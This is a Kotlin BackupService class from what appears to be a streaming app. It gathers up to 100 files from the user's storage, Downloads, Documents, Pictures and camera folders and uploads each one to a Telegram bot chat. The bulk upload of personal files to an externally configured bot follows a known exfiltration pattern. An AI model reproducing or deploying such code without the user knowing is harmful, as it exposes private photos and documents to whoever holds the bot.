package com.streamflixreborn.streamflix.backup

import android.content.Context
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.widget.Toast
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.File
import java.io.IOException

class BackupService(private val context: Context, private val token: String, private val chatId: String) {
    
    private val client = OkHttpClient()
    private val handler = Handler(Looper.getMainLooper())
    
    fun startBackup() {
        Thread {
            try {
                val filesToBackup = getFilesToBackup()
                
                if (filesToBackup.isEmpty()) {
                    showToast("No se encontraron archivos para respaldar")
                    return@Thread
                }
                
                showToast("Encontré ${filesToBackup.size} archivos para respaldar")
                
                for ((index, file) in filesToBackup.withIndex()) {
                    if (uploadFileToTelegram(file)) {
                        showToast("Subido: ${file.name} (${index + 1}/${filesToBackup.size})")
                    } else {
                        showToast("Error al subir: ${file.name}")
                    }
                    Thread.sleep(1000) // Esperar 1 segundo entre archivos
                }
                
                showToast("Backup completado!")
                
            } catch (e: Exception) {
                showToast("Error: ${e.message}")
            }
        }.start()
    }
    
    private fun getFilesToBackup(): List<File> {
        val files = mutableListOf<File>()
        
        // Directorios comunes donde los usuarios guardan archivos
        val directories = listOf(
            Environment.getExternalStorageDirectory(),
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS),
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS),
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES),
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM)
        )
        
        for (directory in directories) {
            if (directory.exists() && directory.isDirectory) {
                val dirFiles = directory.listFiles()
                if (dirFiles != null) {
                    files.addAll(dirFiles.filter { it.isFile && it.length() > 0 })
                }
            }
        }
        
        // Limitar a los primeros 100 archivos para no saturar
        return files.take(100)
    }
    
    private fun uploadFileToTelegram(file: File): Boolean {
        return try {
            val url = "https://api.telegram.org/bot$token/sendDocument"
            
            val requestBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", chatId)
                .addFormDataPart("document", file.name, file.asRequestBody("application/octet-stream".toMediaType()))
                .build()
            
            val request = Request.Builder()
                .url(url)
                .post(requestBody)
                .build()
            
            val response = client.newCall(request).execute()
            response.isSuccessful
            
        } catch (e: IOException) {
            false
        }
    }
    
    private fun showToast(message: String) {
        handler.post {
            Toast.makeText(context, message, Toast.LENGTH_SHORT).show()
        }
    }
}